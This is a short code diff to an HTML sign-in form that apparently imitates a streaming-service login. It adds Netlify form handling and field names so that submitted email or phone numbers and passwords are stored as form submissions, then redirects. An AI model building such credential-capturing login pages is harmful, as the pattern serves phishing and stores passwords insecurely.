@@ -13,13 +13,13 @@
     </nav>
     <div class="form-wrapper">
         <h2>Sign In</h2>
-        <form action="#" netlify>
+        <form action="#" method="POST" onSubmit="submit" data-netlify="true">
             <div class="form-control">
-                <input type="text" required>
+                <input name="name" type="text" required>
                 <label>Email or phone number</label>
             </div>
             <div class="form-control">
-                <input type="password" required>
+                <input name="password" type="password" required>
                 <label>Password</label>
             </div>
             <button type="submit" onclick=redirect()>Sign In</button>
